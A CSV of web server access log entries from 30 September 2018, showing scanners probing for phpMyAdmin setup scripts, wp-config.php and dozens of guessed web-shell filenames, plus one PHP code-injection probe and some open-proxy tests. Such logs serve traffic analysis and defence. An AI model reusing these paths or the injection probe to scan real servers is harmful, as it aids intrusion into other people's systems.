IP,DATE,METHOD,URI,User Agent
"81.19.44.12","30/Sep/2018","GET","/console","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/scripts/setup.php","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/pma/scripts/setup.php","Firefox/57.0"

"81.19.44.12","30/Sep/2018","GET","/","Firefox/57.0"

"208.80.194.30","30/Sep/2018","GET","/Jogos/app/tutorial.pdf","Safari/534.30"

"190.144.85.90","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"190.144.85.90","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"66.249.69.53","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.69.51","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"36.82.236.225","30/Sep/2018","GET","/",""-"

"66.249.69.120","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.69.120","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"116.58.239.126","30/Sep/2018","GET","/","Safari/537.36"

"185.215.234.118","30/Sep/2018","GET","/","Safari/537.36"

"201.57.59.5","30/Sep/2018","GET","/","Safari/537.36"

"186.103.199.252","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"186.103.199.252","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"103.78.181.203","30/Sep/2018","GET","/","Safari/537.36"

"159.203.196.79","30/Sep/2018","GET","/","Firefox/33.0"

"183.234.68.86","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"41.211.112.13","30/Sep/2018","GET","/","Safari/601.7.7"

"192.95.35.228","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"192.95.35.228","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"66.249.69.106","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.69.104","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"118.145.3.27","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"118.145.3.27","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"159.203.96.191","30/Sep/2018","GET","/","Safari/537.36"

"91.134.241.204","30/Sep/2018","POST","/?cmd=echo(344444443%2b1);","Firefox/32.0"

"123.145.23.223","30/Sep/2018","GET","http://www.epochtimes.com/","Firefox/45.0"

"116.252.2.233","30/Sep/2018","GET","http://www.minghui.org/","Safari/537.36"

"175.152.29.255","30/Sep/2018","CONNECT","www.baidu.com:443","librtmp/2.3"

"180.95.227.78","30/Sep/2018","CONNECT","www.voanews.com:443","librtmp/2.3"

"141.8.144.26","30/Sep/2018","GET","/robots.txt","+http://yandex.com/bots)"

"141.8.144.26","30/Sep/2018","GET","/","+http://yandex.com/bots)"

"141.8.143.175","30/Sep/2018","GET","/robots.txt","+http://yandex.com/bots)"

"93.158.166.135","30/Sep/2018","GET","/","+http://yandex.com/bots)"

"66.249.70.10","30/Sep/2018","GET","/robots.txt","+http://www.google.com/bot.html)"

"66.249.70.8","30/Sep/2018","GET","/","+http://www.google.com/bot.html)"

"178.73.215.171","30/Sep/2018","GET","/",""-"

"84.214.150.146","30/Sep/2018","GET","/","Safari/601.7.7"

"103.60.167.118","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"103.60.167.118","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"120.24.48.143","30/Sep/2018","GET","/phpMyAdmin-3.0.1.1/scripts/setup.php","Firefox/57.0"

"120.24.48.143","30/Sep/2018","GET","/phpmyadmin3/scripts/setup.php","Firefox/57.0"

"114.6.34.194","30/Sep/2018","PROPFIND","/",""-"

"114.6.34.194","30/Sep/2018","GET","/webdav/",""Mozilla/5.0"

"114.6.34.194","30/Sep/2018","GET","/help.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/java.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/_query.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/test.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/db_cts.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/db_pma.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/logon.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/help-e.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/license.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/log.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/hell.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/pmd_online.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/x.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/shell.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/htdocs.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/desktop.ini.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/z.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/lala.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/lala-dpr.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/wpo.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/text.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/wp-config.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/muhstik.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/muhstik2.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/muhstiks.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/muhstik-dpr.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/lol.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/uploader.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmd.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmx.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmv.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmdd.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/knal.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cmd.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/shell.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/appserv.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/scripts/setup.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin/scripts/setup.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin/scripts/setup.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/phpmyadmin/scripts/db___.init.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/phpMyAdmin/scripts/db___.init.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/plugins/weathermap/editor.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","GET","/cacti/plugins/weathermap/editor.php","Safari/537.36"

"114.6.34.194","30/Sep/2018","POST","/wuwu11.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xw.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xw1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/9678.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wc.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/s.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/w.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/sheep.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qaq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/db.init.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/db_session.init.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/db__.init.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wp-admins.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/m.php?pbid=open","1.0"

"114.6.34.194","30/Sep/2018","POST","/db_dataml.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/db_desql.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/mx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wshell.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xshell.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/conflg.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/lindex.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/phpstudy.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/phpStudy.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/weixiao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/feixiang.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ak47.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ak48.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xiao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/yao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/defect.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/webslee.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/q.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/pe.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/hm.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/cainiao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuoshou.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuo.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/aotu.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/cmd.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/bak.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/system.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/l6.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/l7.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/l8.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/q.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/56.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/mz.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/yumo.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/min.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wan.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wanan.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ssaa.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/aw.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/12.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/hh.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ak.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ip.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/infoo.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qq.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qwe.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1213.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/post.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/h1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/test.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/3.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/phpinfi.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/aaaa.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/9510.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/python.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/default.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/sean.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/app.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/help.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/tiandi.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/miao.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xz.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/linuxse.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuoindex.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zshmindex.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/tomcat.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ceshi.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1hou.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ou2.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuos.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/zuoss.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/boots.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/she.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/s.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qw.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/test.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/caonma.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ss.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/wcp.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/u.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/uuu.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/sss.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/2.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/core.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qaz.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/sha.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ppx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/1.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/confg.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/conf1g.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/ver.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/hack.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/qa.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/Ss.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/xxx.php","1.0"

"114.6.34.194","30/Sep/2018","POST","/92.php","1.0"

